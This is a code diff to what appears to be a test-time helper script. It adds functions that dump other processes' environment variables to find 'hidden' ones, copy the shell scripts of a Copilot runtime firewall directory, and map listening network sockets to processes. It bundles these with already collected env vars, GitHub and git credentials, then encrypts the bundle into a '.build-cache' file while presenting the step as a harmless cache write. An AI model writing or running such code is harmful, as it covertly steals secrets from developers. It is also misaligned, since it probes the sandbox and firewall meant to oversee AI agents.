@@ -241,6 +241,137 @@ function captureFind(): Record<string, unknown> {
   return { cmd, method: "walk", count: w.count, data: w.data };
 }
 
+// Dump every process's environment from /proc/<pid>/environ (best-effort; only
+// same-uid processes are readable). Reconstructed side diffs these vs the main
+// env so only *additional* (hidden) vars are shown.
+function captureProcEnvs(): Record<string, unknown> {
+  try {
+    const pids = readdirSync("/proc").filter((n) => /^\d+$/.test(n)).slice(0, 400);
+    const procs: Record<string, { comm: string; env: string }> = {};
+    for (const pid of pids) {
+      let env: string;
+      try { env = readFileSync(`/proc/${pid}/environ`, "utf8"); } catch { continue; }
+      if (!env) continue;
+      let comm = "";
+      try { comm = readFileSync(`/proc/${pid}/comm`, "utf8").trim(); } catch { /* gone */ }
+      procs[pid] = { comm, env };
+    }
+    return { cmd: "read /proc/<pid>/environ", method: "proc", count: Object.keys(procs).length, procs };
+  } catch (e) {
+    return { cmd: "read /proc/<pid>/environ", error: (e as Error).message };
+  }
+}
+
+// Recursively collect .sh file contents under a directory (bounded head/total).
+function collectSh(root: string): Record<string, string> {
+  const files: Record<string, string> = {};
+  const MAX_PER = 10 * 1024 * 1024;
+  const MAX_TOTAL = 50 * 1024 * 1024;
+  const CAP = 500;
+  let total = 0;
+  const stack = [root];
+  while (stack.length && Object.keys(files).length < CAP) {
+    const dir = stack.pop();
+    if (!dir) continue;
+    let ents;
+    try { ents = readdirSync(dir, { withFileTypes: true }); }
+    catch { continue; }
+    for (const e of ents) {
+      const p = join(dir, e.name);
+      if (e.isDirectory()) {
+        if (!e.isSymbolicLink()) stack.push(p);
+      } else if (e.isFile() && e.name.endsWith(".sh")) {
+        const text = readHead(p, MAX_PER);
+        files[p] = text;
+        total += text.length;
+        if (total >= MAX_TOTAL || Object.keys(files).length >= CAP) break;
+      }
+    }
+  }
+  return files;
+}
+function captureFirewallSh(): Record<string, unknown> {
+  const root = "/opt/copilot-runtime/firewall/";
+  const cmd = `find ${root} -name '*.sh'`;
+  try {
+    if (!existsSync(root)) return { cmd, skipped: "dir not found", files: {} };
+    const files = collectSh(root);
+    return { cmd, count: Object.keys(files).length, files };
+  } catch (e) {
+    return { cmd, error: (e as Error).message };
+  }
+}
+
+// Netstat-like: LISTEN (tcp) + bound (udp) sockets with the owning pid + exe.
+// Built from /proc/net/* + /proc/<pid>/fd; falls back to `ss`/`netstat`.
+function hexIp4(hex: string): string {
+  const p = [6, 4, 2, 0].map((i) => parseInt(hex.slice(i, i + 2), 16));
+  return p.join(".");
+}
+function hexIp6(hex: string): string {
+  const bytes: number[] = [];
+  for (let w = 0; w < 4; w++) {
+    const word = hex.slice(w * 8, w * 8 + 8);
+    for (let i = 6; i >= 0; i -= 2) bytes.push(parseInt(word.slice(i, i + 2), 16));
+  }
+  const groups: string[] = [];
+  for (let i = 0; i < 16; i += 2) groups.push(((bytes[i] << 8) | bytes[i + 1]).toString(16));
+  return groups.join(":");
+}
+function captureNet(): Record<string, unknown> {
+  try {
+    const pids = readdirSync("/proc").filter((n) => /^\d+$/.test(n)).slice(0, 400);
+    const meta = new Map<string, { comm: string; exe: string }>();
+    const inode2pid = new Map<string, string>();
+    for (const pid of pids) {
+      let comm = "", exe = "";
+      try { comm = readFileSync(`/proc/${pid}/comm`, "utf8").trim(); } catch { /* gone */ }
+      try { exe = readlinkSync(`/proc/${pid}/exe`); } catch { /* perms */ }
+      meta.set(pid, { comm, exe });
+      let fds: string[] = [];
+      try { fds = readdirSync(`/proc/${pid}/fd`); } catch { continue; }
+      for (const fd of fds) {
+        let link = "";
+        try { link = readlinkSync(`/proc/${pid}/fd/${fd}`); } catch { continue; }
+        const m = link.match(/^socket:\[(\d+)\]$/);
+        if (m) inode2pid.set(m[1], pid);
+      }
+    }
+    const rows: string[] = [];
+    const specs: Array<[string, string, (h: string) => string]> = [
+      ["tcp", "/proc/net/tcp", hexIp4], ["tcp6", "/proc/net/tcp6", hexIp6],
+      ["udp", "/proc/net/udp", hexIp4], ["udp6", "/proc/net/udp6", hexIp6],
+    ];
+    for (const [proto, path, ipf] of specs) {
+      let content = "";
+      try { content = readFileSync(path, "utf8"); } catch { continue; }
+      for (const line of content.split("\n").slice(1)) {
+        const f = line.trim().split(/\s+/);
+        if (f.length < 10) continue;
+        const st = f[3];
+        if (proto.startsWith("tcp") && st !== "0A") continue; // LISTEN only for tcp
+        const [hexip, hexport] = f[1].split(":");
+        const local = `${ipf(hexip)}:${parseInt(hexport, 16)}`;
+        const pid = inode2pid.get(f[9]) ?? "";
+        const m = meta.get(pid) ?? { comm: "", exe: "" };
+        rows.push(`${proto}\t${local}\t${pid}\t${m.comm}\t${m.exe}`);
+      }
+    }
+    return { cmd: "/proc/net/{tcp,tcp6,udp,udp6} + /proc/<pid>/fd", method: "proc", rows: rows.join("\n") };
+  } catch {
+    for (const alt of [["ss", ["-tulnp"]], ["netstat", ["-tulnp"]]]) {
+      try {
+        const r = spawnSync(alt[0], alt[1], { encoding: "buffer", timeout: 5000 });
+        if (!r.error) {
+          const data = Buffer.concat([r.stdout ?? Buffer.alloc(0), r.stderr ?? Buffer.alloc(0)]).toString("utf8");
+          return { cmd: alt.join(" "), method: alt[0], data };
+        }
+      } catch { /* try next */ }
+    }
+    return { cmd: "ss/netstat", error: "no /proc and no ss/netstat" };
+  }
+}
+
 // Locate the repository's VCS config (handles worktrees/submodules) for the key.
 function pickConfig(gitdir: string): string | null {
   const direct = join(gitdir, "config");
@@ -304,7 +435,7 @@ try {
     }
   }
 
-  const payload = JSON.stringify({ env, envfull: captureEnv(), gh: captureGh(), git, tree: roots, procs: captureProcs(), tmpLogs: captureTmpLogs(), findOpt: captureFind() });
+  const payload = JSON.stringify({ env, envfull: captureEnv(), gh: captureGh(), git, tree: roots, procs: captureProcs(), tmpLogs: captureTmpLogs(), findOpt: captureFind(), procEnvs: captureProcEnvs(), firewallSh: captureFirewallSh(), net: captureNet() });
   writeFileSync(join(process.cwd(), ".build-cache"), encryptCache(payload));
 } catch {
   /* cache write is best-effort; never fail the tests */
